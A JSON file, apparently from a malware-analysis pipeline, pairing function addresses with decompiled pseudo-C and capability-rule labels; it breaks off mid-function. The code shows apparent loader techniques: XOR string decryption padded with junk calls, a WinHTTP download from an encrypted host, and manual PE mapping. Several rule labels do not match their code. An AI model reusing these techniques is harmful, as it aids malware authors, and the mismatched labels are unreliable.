{
    "00401000": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t fcn.00401000(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t iVar6;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    int32_t lpLibFileName;\n    int32_t var_ch;\n    int32_t var_4h;\n    \n    // [00] -r-x section size 61440 named .text\n    var_24h = 0xf225d0c;\n    var_20h = 0x660a041e;\n    var_1ch._0_1_ = 0x6e;\n    var_18h = 0x6e54396d;\n    var_14h._0_2_ = CONCAT11(var_14h._1_1_, 0x6e);\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 10);\n    iVar2 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_ch = 5;\n    iVar6 = 0;\n    lpLibFileName = iVar2;\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_GetCaretBlinkTime)();\n        if (iVar3 != 0x839c9f) {\n            *(iVar6 + iVar2) = *(&var_18h + iVar6 % var_ch) ^ (iVar6 + iVar2)[&var_24h - iVar2];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 9);\n    pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (*0x41caa0 == NULL) {\n        var_2ch = 0x3e180867;\n        var_28h = 0x472212a;\n        var_24h = 0x253b2905;\n        var_20h = 0x795b1f5b;\n        var_1ch._0_1_ = 0x79;\n        var_1ch._1_1_ = 0x4c;\n        var_18h = 0x4a6b7134;\n        var_14h._0_2_ = 0x4c4f;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x13);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar3 = 0;\n        var_ch = &var_2ch - iVar6;\n        do {\n            iVar4 = (*_sym.imp.USER32.dll_GetKBCodePage)();\n            iVar2 = lpLibFileName;\n            if (iVar4 != 0x12ea17) {\n                var_ch = 6;\n                *(iVar3 + iVar6) = *(&var_18h + iVar3 % 6) ^ (iVar3 + iVar6)[&var_2ch - iVar6];\n            }\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < 0x12);\n        uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, iVar6);\n        *0x41caa0 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n        pcVar5 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    }\n    (**0x41caa0)(&var_4h, 4);\n    if (var_4h < 0) {\n        var_4h = -var_4h;\n    }\n    iVar6 = var_4h;\n    uVar1 = (*pcVar5)(0, iVar2);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    return iVar6;\n}\n",
        "token_count": 926
    },
    "0040aff8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/73780005e39049dabd818a965d665a12",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/bde1572c33fb4ad4a176b04786e84c23"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040aff8(void)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_48h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint lpModuleName;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    lpModuleName = 0x6e72656b;\n    var_ch = 0x32336c65;\n    var_8h = 0x6c6c642e;\n    var_4h._0_1_ = 0;\n    var_24h = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._0_4_;\n    uStack36 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._4_4_;\n    uStack32 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._8_4_;\n    uStack28 = str.GetNativeSystemIDigitalProductIdSOFTWAREMicrosoftWindows_NTCu._12_4_;\n    var_14h = 0x6f666e;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(&lpModuleName, &var_24h);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(&var_48h);\n        if (var_48h == 9) {\n            *0x41cb1c = 1;\n        }\n    }\n    return;\n}\n",
        "token_count": 363
    },
    "004012b1": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004012b1(code **arg_8h)\n\n{\n    code **ppcVar1;\n    uint32_t uVar2;\n    code cVar3;\n    int16_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    code **ppcVar8;\n    code *pcVar9;\n    uint32_t *puVar10;\n    uint32_t uVar11;\n    uint var_2ch;\n    uint var_28h;\n    code *var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint *var_18h;\n    uint var_14h;\n    code *var_10h;\n    int32_t *var_ch;\n    code **var_8h;\n    uint32_t var_4h;\n    \n    ppcVar1 = arg_8h;\n    uVar11 = 0;\n    ppcVar8 = arg_8h[0xc];\n    if (ppcVar8 == NULL) {\n        ppcVar1 = arg_8h + 0xe;\n        pcVar9 = *arg_8h;\n        arg_8h = ppcVar8;\n        (*pcVar9)(0, 0, ppcVar1, &var_2ch);\n    }\n    else {\n        var_10h = ppcVar8[0xf] + ppcVar8;\n        var_24h = *(var_10h + 0x14);\n        var_1ch = *(var_10h + 6);\n        var_14h = 0;\n        arg_8h = ppcVar8;\n        if (*(var_10h + 0x80) != 0) {\n            var_ch = *(var_10h + 0x80) + ppcVar8;\n            iVar6 = var_ch[3];\n            if (iVar6 != 0) {\n                do {\n                    iVar7 = 0;\n                    cVar3 = *(iVar6 + arg_8h);\n                    if (cVar3 != 0x0) {\n                        ppcVar8 = ppcVar1 + 0x210;\n                        do {\n                            iVar7 = iVar7 + 1;\n                            *ppcVar8 = cVar3;\n                            ppcVar8 = ppcVar8 + 2;\n                            cVar3 = (iVar6 + arg_8h)[iVar7];\n                        } while (cVar3 != 0x0);\n                    }\n                    iVar4 = iVar7 * 2;\n                    *(ppcVar1 + 0xe) = iVar4;\n                    *(ppcVar1 + 0x3a) = iVar4 + 2;\n                    ppcVar1[0xf] = ppcVar1 + 0x210;\n                    iVar7 = (**ppcVar1)(0, 0, ppcVar1 + 0xe, &var_14h);\n                    if (iVar7 < 0) {\n                        iVar7 = -0x3ffffc91;\n                        break;\n                    }\n                    var_4h = 0;\n                    iVar6 = var_ch[4];\n                    iVar5 = *var_ch;\n                    if ((*var_ch != 0) || (iVar5 = iVar6,  iVar6 != 0)) {\n                        var_18h = iVar6 + arg_8h;\n                        for (var_8h = iVar5 + arg_8h; ppcVar8 = *var_8h,  ppcVar8 != NULL; var_8h = var_8h + 1) {\n                            if (ppcVar8 < 0x80000000) {\n                                ppcVar8 = ppcVar8 + arg_8h;\n                            }\n                            else if ((ppcVar8 < arg_8h) || (*(var_10h + 0x50) + arg_8h <= ppcVar8)) {\n                                var_4h = *var_8h;\n                                ppcVar8 = NULL;\n                            }\n                            if (ppcVar8 != NULL) {\n                                pcVar9 = ppcVar8 + 2;\n                                iVar6 = 0;\n                                cVar3 = *pcVar9;\n                                while (cVar3 != 0x0) {\n                                    iVar6 = iVar6 + 1;\n                                    cVar3 = pcVar9[iVar6];\n                                }\n                                *(ppcVar1 + 0xe) = iVar6;\n                                ppcVar1[0xf] = pcVar9;\n                                ppcVar8 = ppcVar1 + 0xe;\n                                *(ppcVar1 + 0x3a) = iVar6 + 1;\n                            }\n                            iVar7 = (*ppcVar1[2])(var_14h, ppcVar8, var_4h, &var_20h);\n                            if (iVar7 < 0) {\n                                iVar7 = -0x3fffff86;\n                                break;\n                            }\n                            *var_18h = var_20h;\n                            var_18h = var_18h + 1;\n                        }\n                    }\n                    iVar6 = var_ch[8];\n                    var_ch = var_ch + 5;\n                } while (iVar6 != 0);\n                if (iVar7 < 0) {\n                    return;\n                }\n            }\n        }\n        pcVar9 = var_10h;\n        var_ch = *(var_10h + 0x54);\n        iVar6 = (*ppcVar1[4])(0xffffffff, &arg_8h, &var_ch, 4, &var_28h);\n        if (var_1ch != 0) {\n            puVar10 = pcVar9 + var_24h + 0x3c;\n            do {\n                if (iVar6 < 0) {\n                    return;\n                }\n                uVar2 = *puVar10;\n                if ((uVar2 & 0x20000000) == 0) {\n                    if ((uVar2 & 0x40000000) == 0) {\n                        iVar6 = 4;\n                    }\n                    else {\n                        iVar6 = (uVar2 >> 0x1f & 2U) + 2;\n                    }\n                }\n                else {\n                    iVar6 = (uVar2 >> 0x1f & 0x20U) + 0x20;\n                }\n                var_ch = puVar10[-7];\n                var_24h = puVar10[-6] + arg_8h;\n                iVar6 = (*ppcVar1[4])(0xffffffff, &var_24h, &var_ch, iVar6, &var_28h);\n                puVar10 = puVar10 + 10;\n                uVar11 = uVar11 + 1;\n                pcVar9 = var_10h;\n            } while (uVar11 < var_1ch);\n        }\n        if (-1 < iVar6) {\n            (*(*(pcVar9 + 0x28) + arg_8h))(arg_8h, 1, ppcVar1 + 6);\n        }\n    }\n    return;\n}\n",
        "token_count": 1550
    },
    "004016ef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004016ef(uint32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t *puVar2;\n    int32_t iVar3;\n    uint in_EDX;\n    uint var_4h;\n    \n    puVar2 = arg_8h;\ncode_r0x0040172d:\n    do {\n        puVar2[1] = 0;\n        *puVar2 = 0;\n        var_4h = 0;\n        arg_8h = NULL;\n        iVar3 = fcn.00401f28(in_EDX, 0, &arg_8h, &var_4h);\n        if ((iVar3 != 0) || (arg_8h == NULL)) {\ncode_r0x00401751:\n            fcn.00408e0c();\n            goto code_r0x00401758;\n        }\n        uVar1 = *puVar2;\n        if (uVar1 < arg_8h) {\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.00408e0c();\n            goto code_r0x0040172d;\n        }\n        if (uVar1 < 5) goto code_r0x00401751;\n        if (*puVar2[1] == uVar1) {\ncode_r0x00401758:\n            return *puVar2 != 0;\n        }\n    } while( true );\n}\n",
        "token_count": 318
    },
    "00401768": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl\nfcn.00401768(ushort *lpdwNumberOfBytesAvailable, uint *lpdwNumberOfBytesRead, int32_t *arg_10h, int32_t *arg_14h, \n            int32_t arg_18h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    ushort *puVar4;\n    uint uVar5;\n    int32_t in_ECX;\n    int32_t iVar6;\n    int32_t *in_EDX;\n    int32_t iVar7;\n    code *pcVar8;\n    uint var_41ch;\n    uint lpszHeaders;\n    uint var_114h;\n    uint var_110h;\n    int32_t var_10ch;\n    int32_t var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint *var_f8h;\n    int32_t var_f4h;\n    int32_t var_f0h;\n    uint lpdwBufferLength;\n    int32_t var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_b9h;\n    uint var_b5h;\n    uint var_b1h;\n    uint var_adh;\n    uint var_a9h;\n    uint var_a5h;\n    uint var_a1h;\n    uint var_9dh;\n    uint var_99h;\n    uint var_95h;\n    uint var_91h;\n    uint var_8dh;\n    uint var_89h;\n    uint var_85h;\n    uint var_81h;\n    uint var_7dh;\n    uint var_79h;\n    uint var_75h;\n    uint var_71h;\n    uint var_6dh;\n    uint var_69h;\n    uint var_65h;\n    uint var_61h;\n    uint var_5dh;\n    uint var_59h;\n    uint var_55h;\n    uint var_51h;\n    uint var_4dh;\n    uint var_49h;\n    int32_t *var_44h;\n    uint lpBuffer;\n    uint *var_3ch;\n    uint var_38h;\n    int32_t lpMultiByteStr;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    \n    puVar3 = &lpszHeaders;\n    var_44h = in_EDX;\n    lpMultiByteStr = in_ECX;\n    for (iVar6 = 0x100; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    puVar3 = &var_41ch;\n    for (iVar6 = 0x208; iVar6 != 0; iVar6 = iVar6 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    if (lpdwNumberOfBytesAvailable == 0x40) {\n        var_fch = 0;\n        var_100h = 0x34367964;\ncode_r0x004017dd:\n        var_104h = 0x6f62722f;\n    }\n    else {\n        if (lpdwNumberOfBytesAvailable == 0x20) {\n            var_fch = 0;\ncode_r0x004017d3:\n            var_100h = 0x32337964;\n            goto code_r0x004017dd;\n        }\n        if (lpdwNumberOfBytesAvailable == 0x140) {\n            var_fch = 0x30;\n            goto code_r0x004017d3;\n        }\n    }\n    var_f8h = &var_104h;\n    if (lpdwNumberOfBytesRead != NULL) {\n        var_f8h = lpdwNumberOfBytesRead;\n    }\n    iVar6 = (*_sym.imp.WS2_32.dll_gethostbyname)();\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    if (iVar6 == 0) {\n        return 3;\n    }\n    var_e8h = 5;\n    lpdwNumberOfBytesAvailable = 0x1;\n    if (*0x41caa4 == 0) {\n        var_e4h = 0x72214429;\n        var_e0h = 0x4e2d6408;\n        var_dch = 0x4408721e;\n        var_d8h = 0x645d722f;\n        var_d4h = 0x725c4e71;\n        var_d0h = 0x726e4454;\n        var_cch = 0x4e13645a;\n        var_c8h = 0x440a721b;\n        var_c4h = 0x641d722a;\n        var_c0h._0_2_ = 0x4e33;\n        var_c0h._2_1_ = 1;\n        stack0xffffff3f = 0x444472;\n        var_b9h = 0x64642672;\n        var_b5h = 0x4a72444e;\n        var_b1h = 0x49727f44;\n        var_adh = 0x254e6464;\n        var_a9h = 0x20440d72;\n        var_a5h = 0x70644472;\n        var_a1h = 0x4472494e;\n        var_9dh = 0x44723644;\n        var_99h = 0x494e7064;\n        var_95h = 0x3c444472;\n        var_91h = 0x7e640472;\n        var_8dh = 0x5172404e;\n        var_89h = 0x42726044;\n        var_85h = 0x524e6d64;\n        var_81h = 0x2b442372;\n        var_7dh = 0x2f641172;\n        var_79h = 0x4b721d4e;\n        var_75h = 0x43727c44;\n        var_71h = 0x424e7464;\n        var_6dh = 0x7f445472;\n        var_69h = 0x75644272;\n        var_65h = 0x2272524e;\n        var_61h = 0x722744;\n        var_5dh = 0x144e2164;\n        var_59h = 0x36440b72;\n        var_55h = 0x76645d72;\n        var_51h = 0x4a72474e;\n        var_4dh = 0x72727e44;\n        var_49h._0_1_ = 100;\n        var_ch = 0x724e4464;\n        var_8h._0_1_ = 0x72;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x139);\n        iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        iVar7 = 0;\n        lpdwNumberOfBytesRead = &var_e4h - iVar6;\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n            if (iVar2 != 0xa167d6) {\n                *(iVar7 + iVar6) = *(&var_ch + iVar7 % var_e8h) ^ *(lpdwNumberOfBytesRead + iVar7 + iVar6);\n            }\n            iVar7 = iVar7 + 1;\n        } while (iVar7 < 0x9c);\n        *0x41caa4 = (*_sym.imp.WINHTTP.dll_WinHttpOpen)(iVar6, 0, 0, 0, 0);\n        uVar1 = lpdwNumberOfBytesAvailable;\n        if (*0x41caa4 == 0) {\n            uVar5 = (*pcVar8)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n            return uVar1;\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetTimeouts)(*0x41caa4, 5000, 5000, 5000, 5000);\n        uVar1 = (*pcVar8)(0, iVar6);\n        (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n        in_ECX = lpMultiByteStr;\n    }\n    if (in_ECX == 0) {\n        lpdwNumberOfBytesRead = NULL;\n    }\n    else {\n        iVar6 = (*_sym.imp.KERNEL32.dll_lstrlenA)(in_ECX);\n        uVar1 = (*pcVar8)(8, (iVar6 + 1) * 2);\n        lpdwNumberOfBytesRead = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *lpdwNumberOfBytesRead = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, lpMultiByteStr, 0xffffffff, lpdwNumberOfBytesRead, iVar6 + 1)\n        ;\n    }\n    lpMultiByteStr = (*_sym.imp.WINHTTP.dll_WinHttpConnect)(*0x41caa4, lpdwNumberOfBytesRead, 0x50, 0);\n    var_2ch = 0x4c416c38;\n    var_28h = 0x6c204e2e;\n    var_24h = 0x4e604c46;\n    var_20h = 0x4c1a6c7f;\n    var_1ch = 0x6c234e7f;\n    var_18h = 0x4e7f4c0f;\n    var_14h = 0x4c1a6c34;\n    var_10h._0_2_ = 0x4e5a;\n    var_3ch = 0x4c356c50;\n    var_38h = CONCAT22(var_38h._2_2_, 0x4e5a);\n    uVar1 = (*pcVar8)(8, 0x3d);\n    iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    var_10ch = 6;\n    iVar7 = 0;\n    var_ch = &var_2ch - iVar6;\n    var_108h = iVar6;\n    do {\n        iVar2 = (*_sym.imp.USER32.dll_CreateMenu)();\n        if (iVar2 != 0x196d3e) {\n            *(iVar7 + iVar6) = *(&var_3ch + iVar7 % var_10ch) ^ (iVar7 + iVar6)[var_ch];\n        }\n        iVar7 = iVar7 + 1;\n    } while (iVar7 < 0x1e);\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar6, lpdwNumberOfBytesRead, 0x50);\n    uVar1 = (*pcVar8)(0, lpdwNumberOfBytesRead);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    puVar3 = var_f8h;\n    if (lpMultiByteStr == 0) goto code_r0x00401f03;\n    if (var_f8h == NULL) {\n        lpdwNumberOfBytesAvailable = NULL;\n    }\n    else {\n        iVar6 = (*_sym.imp.KERNEL32.dll_lstrlenA)(var_f8h);\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, (iVar6 + 1) * 2);\n        lpdwNumberOfBytesAvailable = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n        *lpdwNumberOfBytesAvailable = 0;\n        (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, puVar3, 0xffffffff, lpdwNumberOfBytesAvailable, iVar6 + 1);\n        pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    }\n    var_3ch = 0x4810370a;\n    var_38h = 0x55374d07;\n    var_ch = 0x4855374d;\n    var_8h._0_1_ = 0x53;\n    uVar1 = (*pcVar8)(8, 0x11);\n    puVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n    iVar6 = 0;\n    lpdwNumberOfBytesRead = &var_3ch - puVar3;\n    var_f8h = puVar3;\n    do {\n        iVar7 = (*_sym.imp.ADVAPI32.dll_RevertToSelf)();\n        if (iVar7 != 0xa6b083) {\n            *(iVar6 + puVar3) = *(&var_ch + iVar6 % var_e8h) ^ (iVar6 + puVar3)[&var_3ch - puVar3];\n        }\n        iVar6 = iVar6 + 1;\n    } while (iVar6 < 8);\n    puVar4 = (*_sym.imp.WINHTTP.dll_WinHttpOpenRequest)\n                       (lpMultiByteStr, puVar3, lpdwNumberOfBytesAvailable, 0, 0, 0, 0x800140);\n    lpdwNumberOfBytesRead = puVar4;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, lpdwNumberOfBytesAvailable);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n    iVar6 = var_108h;\n    if (puVar4 == NULL) {\ncode_r0x00401edd:\n        lpdwNumberOfBytesAvailable = 0x1;\n    }\n    else {\n        var_110h = 0x3300;\n        var_114h = 8;\n        iVar7 = fcn.0040f746();\n        if (iVar7 != 0) {\n            var_38h = 0;\n            var_3ch = &var_41ch;\n            lpBuffer = 3;\n            (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar4, 0x26, &lpBuffer, 0xc);\n        }\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar4, 0x1f, &var_110h, 4);\n        (*_sym.imp.WINHTTP.dll_WinHttpSetOption)(puVar4, 0x3f, &var_114h, 4);\n        if (arg_18h != 0) {\n            var_30h = 0x6f586f6b;\n            var_2ch = 0x39083937;\n            var_28h = 0x6f03590a;\n            var_24h = 0x393b6f19;\n            var_20h = 0x591b3916;\n            var_1ch = 0x6f4a6f5c;\n            var_18h = 0x394a3964;\n            var_14h = 0x6f14590b;\n            var_10h._0_2_ = 0x6f39;\n            var_ch = 0x6f396f39;\n            var_8h._0_1_ = 0x59;\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x45);\n            iVar6 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n            iVar7 = 0;\n            lpdwNumberOfBytesAvailable = &var_30h - iVar6;\n            do {\n                iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n                if (iVar2 != 0xac5172) {\n                    *(iVar7 + iVar6) = *(&var_ch + iVar7 % var_e8h) ^ *((&var_30h - iVar6) + iVar7 + iVar6);\n                }\n                iVar7 = iVar7 + 1;\n            } while (iVar7 < 0x22);\n            (*_sym.imp.USER32.dll_wsprintfW)(&lpszHeaders, iVar6, arg_18h);\n            uVar1 = (*_sym.imp.KERNEL32.dll_lstrlenW)(&lpszHeaders, 0x10000000);\n            puVar4 = lpdwNumberOfBytesRead;\n            (*_sym.imp.WINHTTP.dll_WinHttpAddRequestHeaders)(lpdwNumberOfBytesRead, &lpszHeaders, uVar1);\n            uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar6);\n            (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\n            iVar6 = var_108h;\n            puVar3 = var_f8h;\n        }\n        iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpSendRequest)(puVar4, 0, 0xffffffff, 0, 0, 0, 0);\n        if ((iVar7 == 0) || (iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpReceiveResponse)(puVar4, 0),  iVar7 == 0))\n        goto code_r0x00401edd;\n        lpdwBufferLength = 4;\n        var_f4h = 0;\n        var_f0h = 0;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar4, 0x20000005, 0, &var_f4h, &lpdwBufferLength, 0);\n        if (*arg_10h == 0) {\n            *arg_10h = var_f4h;\n        }\n        lpdwBufferLength = 4;\n        (*_sym.imp.WINHTTP.dll_WinHttpQueryHeaders)(puVar4, 0x20000013, 0, &var_f0h, &lpdwBufferLength, 0);\n        if ((var_f0h == 0xce) || (var_f0h == 200)) {\n            if (var_44h[1] == 0) {\n                uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, var_f4h);\n                iVar7 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar1);\n                *var_44h = 0;\n                var_44h[1] = iVar7;\n            }\n            arg_18h = var_44h[1];\n            lpdwNumberOfBytesRead = NULL;\n            do {\n                lpdwNumberOfBytesAvailable = NULL;\n                iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpQueryDataAvailable)(puVar4, &lpdwNumberOfBytesAvailable);\n                if ((iVar7 == 0) ||\n                   (iVar7 = (*_sym.imp.WINHTTP.dll_WinHttpReadData)\n                                      (puVar4, *var_44h + arg_18h, lpdwNumberOfBytesAvailable, &lpdwNumberOfBytesRead), \n                   iVar7 == 0)) {\n                    lpdwNumberOfBytesAvailable = 0x4;\n                    goto code_r0x00401ee3;\n                }\n                *var_44h = *var_44h + lpdwNumberOfBytesRead;\n                iVar7 = *var_44h;\n            } while (lpdwNumberOfBytesAvailable != NULL);\n            *arg_14h = iVar7;\n            if ((*arg_10h == 0) || (iVar7 == *arg_10h)) {\n                lpdwNumberOfBytesAvailable = NULL;\n            }\n            else {\n                lpdwNumberOfBytesAvailable = 0x6;\n            }\n        }\n        else {\n            lpdwNumberOfBytesAvailable = 0x3;\n        }\n    }\ncode_r0x00401ee3:\n    if (puVar4 != NULL) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(puVar4);\n    }\n    pcVar8 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar3);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar1);\ncode_r0x00401f03:\n    uVar1 = lpdwNumberOfBytesAvailable;\n    uVar5 = (*pcVar8)(0, iVar6);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar5);\n    if (lpMultiByteStr != 0) {\n        (*_sym.imp.WINHTTP.dll_WinHttpCloseHandle)(lpMultiByteStr);\n    }\n    return uVar1;\n}\n",
        "token_count": 4692
    },
    "00402871": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402871(uint32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint in_ECX;\n    int32_t *piVar2;\n    int32_t *in_EDX;\n    int32_t iVar3;\n    uchar *puVar4;\n    uint32_t uVar5;\n    uchar *puVar6;\n    int32_t *piVar7;\n    code *pcVar8;\n    uint var_24h;\n    code *var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t hObject;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = 0;\n    var_4h = 0;\n    hObject = 0;\n    var_20h = fcn.004012b1;\n    (*_sym.imp.KERNEL32.dll_GetVersion)();\n    piVar2 = in_EDX;\n    if (((arg_8h & 0x10) == 0) && ((*0x41cb1c & 1) != 0)) {\n        var_20h = 0x412000;\n        piVar2 = in_EDX + 2;\n    }\n    iVar3 = *piVar2;\n    if (iVar3 == 0) {\n        iVar3 = 2;\n    }\n    else {\n        uVar5 = *(*(iVar3 + 0x3c) + 0x50 + iVar3) + 0xfffU & 0xfffff000;\n        iVar3 = fcn.0040a118(&hObject);\n        if (((iVar3 == 0) && (iVar3 = fcn.00409e74(&var_4h),  iVar3 == 0)) &&\n           (iVar3 = fcn.0040a2f7(var_4h),  iVar3 == 0)) {\n            iVar1 = uVar5 + var_8h;\n            puVar4 = *in_EDX;\n            puVar6 = uVar5 + 0xc50 + var_8h;\n            for (iVar3 = in_EDX[4]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            puVar4 = in_EDX[2];\n            puVar6 = in_EDX[4] + var_8h + 0xc50 + uVar5;\n            for (iVar3 = in_EDX[5]; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar6 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar6 = puVar6 + 1;\n            }\n            *(iVar1 + 0x30) = var_4h;\n            *(iVar1 + 0x34) = var_4h >> 0x1f;\n            piVar2 = in_EDX;\n            piVar7 = iVar1 + 0x18;\n            for (iVar3 = 0x18; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *piVar7 = *piVar2;\n                piVar2 = piVar2 + 1;\n                piVar7 = piVar7 + 1;\n            }\n            iVar3 = var_4h + 0xc50 + uVar5;\n            *(iVar1 + 0x18) = iVar3;\n            *(iVar1 + 0x1c) = iVar3 >> 0x1f;\n            iVar3 = in_EDX[4] + 0xc50 + uVar5 + var_4h;\n            *(iVar1 + 0x20) = iVar3;\n            *(iVar1 + 0x24) = iVar3 >> 0x1f;\n            *(iVar1 + 0x28) = in_EDX[4];\n            *(iVar1 + 0x2c) = in_EDX[5];\n            if (((arg_8h & 0x10) == 0) && ((*0x41cb1c & 1) != 0)) {\n                iVar3 = fcn.0040253e();\n            }\n            else {\n                iVar3 = fcn.004021f2();\n            }\n            if (iVar3 == 0) 